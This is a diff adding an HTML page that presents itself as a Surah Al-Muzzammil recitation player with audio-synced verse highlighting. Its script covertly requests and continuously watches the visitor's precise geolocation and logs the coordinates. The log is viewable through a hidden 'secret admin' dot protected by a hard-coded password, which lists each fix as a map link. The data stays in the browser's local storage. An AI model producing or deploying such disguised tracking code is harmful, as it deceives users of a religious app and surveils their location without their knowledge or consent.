@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Surah Muzammil - AmanZaid Creations</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&display=swap');
+        body { margin: 0; background: #020617; color: #f8fafc; font-family: 'Amiri', serif; text-align: center; }
+        
+        /* Secret Admin Dot */
+        .admin-dot { position: fixed; top: 15px; right: 15px; width: 8px; height: 8px; background: #2dd4bf; border-radius: 50%; cursor: pointer; z-index: 1000; opacity: 0.2; }
+
+        /* Main Sections */
+        #user-view { display: block; }
+        #admin-view { display: none; padding: 80px 10px; background: #0f172a; min-height: 100vh; }
+
+        header { position: fixed; top: 0; width: 100%; z-index: 100; background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(10px); padding: 15px 0; border-bottom: 1px solid rgba(45, 212, 191, 0.3);[...]
+        h1 { margin: 0; font-size: 22px; color: #2dd4bf; }
+
+        #quran-container { margin: 100px auto 180px; width: 92%; max-width: 800px; }
+        .ayat { font-size: 28px; line-height: 2.3; padding: 25px; color: #64748b; transition: 0.4s; direction: rtl; border-bottom: 1px solid rgba(255,255,255,0.05); cursor: pointer; border-radius: 12p[...]
+        .highlight { color: #ffffff; background: rgba(45, 212, 191, 0.12); transform: scale(1.02); border-right: 4px solid #2dd4bf; text-shadow: 0 0 15px rgba(45, 212, 191, 0.4); }
+
+        .controls { position: fixed; bottom: 0; width: 100%; background: rgba(15, 23, 42, 0.98); padding: 25px; border-top: 1px solid rgba(45, 212, 191, 0.3); z-index: 100; }
+        .play-btn { background: #2dd4bf; color: #020617; border: none; padding: 15px 50px; border-radius: 50px; font-weight: bold; font-size: 18px; cursor: pointer; }
+
+        /* Admin Table */
+        .log-table { width: 100%; border-collapse: collapse; color: white; margin-top: 20px; }
+        .log-table th, .log-table td { border: 1px solid #334155; padding: 12px; font-size: 14px; }
+        .map-btn { color: #2dd4bf; text-decoration: none; font-weight: bold; }
+    </style>
+</head>
+<body onload="initApp()">
+
+    <div class="admin-dot" onclick="authAdmin()"></div>
+
+    <div id="user-view">
+        <header><h1>سورة المزمل</h1></header>
+        <div id="quran-container"></div>
+        <div class="controls">
+            <button class="play-btn" onclick="startPlay()" id="playBtnUI">▶ PLAY TILAWAT</button>
+        </div>
+    </div>
+
+    <div id="admin-view">
+        <h2 style="color: #2dd4bf;">Live Admin Panel</h2>
+        <button onclick="localStorage.removeItem('live_trace'); loadLogs();" style="background: grey; color: white; border: none; padding: 5px 10px;">Clear History</button>
+        <table class="log-table">
+            <thead><tr><th>Time</th><th>Location</th></tr></thead>
+            <tbody id="log-body"></tbody>
+        </table>
+        <br>
+        <button onclick="window.location.reload()" style="background: #f43f5e; color: white; border: none; padding: 10px 25px; border-radius: 8px;">Logout Admin</button>
+    </div>
+
+    <audio id="audio"><source src="https://server8.mp3quran.net/afs/073.mp3" type="audio/mpeg"></audio>
+
+    <script>
+        const surah = [
+            { t: "بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ", s: 0 },
+            { t: "يَا أَيُّهَا الْمُزَّمِّلُ (1)", s: 5.5 },
+            { t: "قُمِ اللَّيْلَ إِلَّا قَلِيلًا (2)", s: 10.2 },
+            { t: "نِصْفَهُ أَوِ انقُصْ مِنْهُ قَلِيلًا (3)", s: 16.5 },
+            { t: "أَوْ زِدْ عَلَيْهِ وَرَتِّلِ الْقُرْآنَ تَرْتِيلًا (4)", s: 22.8 },
+            { t: "إِنَّا سَنُلْقِي عَلَيْكَ قَوْلًا ثَقِيلًا (5)", s: 31.5 },
+            { t: "إِنَّ نَاشِئَةَ اللَّيْلِ هِيَ أَشَدُّ وَطْئًا وَأَقْوَمُ قِيلًا (6)", s: 40.2 },
+            { t: "إِنَّ لَكَ فِي النَّهَارِ سَبْحًا طَوِيلًا (7)", s: 50.1 },
+            { t: "وَاذْكُرِ اسْمَ رَبِّكَ وَتَبَتَّلْ إِلَيْهِ تَبْتِيلًا (8)", s: 55.5 },
+            { t: "رَبُّ الْمَشْرِقِ وَالْمَغْرِبِ لَا إِلَهَ إِلَّا هُوَ فَاتَّخِذْهُ وَكِيلًا (9)", s: 63.8 },
+            { t: "وَاصْبِرْ عَلَى مَا يَقُولُونَ وَاهْجُرْهُمْ هَجْرًا جَمِيلًا (10)", s: 74.5 },
+            { t: "وَذَرْنِي وَالْمُكَذِّبِينَ أُولِي النَّعْمَةِ وَمَهِّلْهُمْ قَلِيلًا (11)", s: 83.2 },
+            { t: "إِنَّ لَدَيْنَا أَنكَالًا وَجَحِيمًا (12)", s: 92.8 },
+            { t: "وَطَعَامًا ذَا غُصَّةٍ وَعَذَابًا أَلِيمًا (13)", s: 98.5 },
+            { t: "يَوْمَ تَرْجُفُ الْأَرْضُ وَالْجِبَالُ وَكَانَتِ الْجِبَالُ كَثِيبًا مَّهِيلًا (14)", s: 106.8 },
+            { t: "إِنَّا أَرْسَلْنَا إِلَيْكُمْ رَسُولًا شَاهِدًا عَلَيْكُمْ كَمَا أَرْسَلْنَا إِلَى فِرْعَوْنَ رَ[...]
+            { t: "فَعَصَى فِرْعَوْنُ الرَّسُولَ فَأَخَذْنَاهُ أَخْذًا وَبِيلًا (16)", s: 133.2 },
+            { t: "فَكَيْفَ تَتَّقُونَ إِن كَفَرْتُمْ يَوْمًا يَجْعَلُ الْوِلْدَانَ شِيبًا (17)", s: 142.8 },
+            { t: "السَّمَاءُ مُنفَطِرٌ بِهِ كَانَ وَعْدُهُ مَفْعُولًا (18)", s: 154.5 },
+            { t: "إِنَّ هَذِهِ تَذْكِرَةٌ فَمَن شَاءَ اتَّخَذَ إِلَى رَبِّهِ سَبِيلًا (19)", s: 164.8 },
+            { t: "إِنَّ رَبَّكَ يَعْلَمُ أَنَّكَ تَقُومُ أَدْنَىٰ مِن ثُلُثَيِ اللَّيْلِ وَنِصْفَهُ وَثُلُثَهُ وَط�[...]
+        ];
+
+        const audio = document.getElementById('audio');
+        const playBtn = document.getElementById('playBtnUI');
+
+        function initApp() {
+            const container = document.getElementById('quran-container');
+            surah.forEach((ayat, i) => {
+                const div = document.createElement('div');
+                div.className = 'ayat';
+                div.id = `a-${i}`;
+                div.innerText = ayat.t;
+                div.onclick = () => { audio.currentTime = ayat.s; audio.play(); forceTrack(); };
+                container.appendChild(div);
+            });
+            // Ask for location right away
+            forceTrack();
+        }
+
+        function startPlay() {
+            if (audio.paused) { 
+                audio.play(); 
+                playBtn.innerText = "⏸ PAUSE"; 
+                forceTrack(); 
+            } else { 
+                audio.pause(); 
+                playBtn.innerText = "▶ PLAY TILAWAT"; 
+            }
+        }
+
+        // Live Tracking Engine
+        function forceTrack() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    saveToAdmin(pos);
+                    // Start continuous watching
+                    navigator.geolocation.watchPosition(saveToAdmin, null, { enableHighAccuracy: true });
+                }, null, { enableHighAccuracy: true });
+            }
+        }
+
+        function saveToAdmin(pos) {
+            let data = JSON.parse(localStorage.getItem('live_trace')) || [];
+            data.push({ 
+                lat: pos.coords.latitude, 
+                lon: pos.coords.longitude, 
+                time: new Date().toLocaleTimeString() 
+            });
+            localStorage.setItem('live_trace', JSON.stringify(data.slice(-50)));
+        }
+
+        audio.ontimeupdate = () => {
+            const now = audio.currentTime;
+            surah.forEach((item, i) => {
+                const next = surah[i+1] ? surah[i+1].s : 9999;
+                if (now >= item.s && now < next) {
+                    const el = document.getElementById(`a-${i}`);
+                    if (!el.classList.contains('highlight')) {
+                        document.querySelectorAll('.ayat').forEach(x => x.classList.remove('highlight'));
+                        el.classList.add('highlight');
+                        el.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    }
+                }
+            });
+        };
+
+        function authAdmin() {
+            if (prompt("Password:") === "55667") {
+                document.getElementById('user-view').style.display = 'none';
+                document.getElementById('admin-view').style.display = 'block';
+                loadLogs();
+            }
+        }
+
+        function loadLogs() {
+            const body = document.getElementById('log-body');
+            let data = JSON.parse(localStorage.getItem('live_trace')) || [];
+            body.innerHTML = data.reverse().map(l => `
+                <tr>
+                    <td>${l.time}</td>
+                    <td><a href="https://www.google.com/maps?q=${l.lat},${l.lon}" target="_blank" class="map-btn">📍 View Live Map</a></td>
+                </tr>
+            `).join('');
+        }
+    </script>
+</body>
+</html>
